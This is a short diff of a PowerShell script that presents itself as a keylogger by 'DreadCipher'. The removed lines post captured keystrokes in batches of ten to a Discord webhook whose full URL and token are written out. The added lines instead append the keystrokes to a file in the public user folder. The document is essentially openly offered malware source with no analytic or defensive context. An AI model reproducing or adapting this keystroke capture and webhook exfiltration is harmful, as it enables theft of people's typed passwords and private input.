@@ -1,5 +1,4 @@
-# Keylogger with Discord by DreadCipher
-$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
+# Keylogger Test by DreadCipher
 $buffer = ""
 
 while ($true) {
@@ -8,8 +7,7 @@ while ($true) {
         $key = [Console]::ReadKey($true)
         $buffer += $key.Char
         if ($buffer.Length -ge 10) {
-            $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+            $buffer | Out-File -FilePath "C:\Users\Public\log.txt" -Append
             $buffer = ""
         }
     }
